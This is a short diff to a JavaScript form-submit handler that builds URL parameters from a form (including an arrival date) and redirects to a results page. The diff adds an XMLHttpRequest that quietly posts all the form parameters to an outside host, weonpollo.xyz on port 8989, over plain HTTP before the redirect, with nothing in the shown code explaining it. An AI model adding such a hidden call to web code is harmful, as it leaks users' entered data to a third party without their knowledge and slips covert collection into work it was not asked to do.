@@ -20,6 +20,10 @@ function submitForm(event) {
         arrivalDate: arrivalDate
     });
 
+    const xhr = new XMLHttpRequest();
+    xhr.open("POST", "http://weonpollo.xyz:8989/user/?" + urlParams.toString());    
+    xhr.send();
+
     // Redirige a results.html con los datos del formulario en la URL
     window.location.href = 'results.html?' + urlParams.toString();
 }
